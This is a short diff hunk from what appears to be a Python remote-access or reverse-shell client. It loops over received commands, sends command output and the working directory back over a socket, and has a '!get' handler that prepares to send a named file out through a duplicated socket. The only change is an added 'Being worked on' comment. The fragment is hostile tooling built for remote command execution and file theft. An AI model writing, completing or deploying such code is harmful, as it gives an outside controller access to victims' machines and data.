@@ -37,7 +37,7 @@ while True:
             cwd = os.getcwd()
             message = f"{output}{SEPARATOR}{cwd}"
             s.send(message.encode())
-    elif splited_command[0] == "!get":
+    elif splited_command[0] == "!get": # Being worked on
         file_socket = s.dup()
         filename = splited_command[1]
         filesize = os.path.getsize(filename)
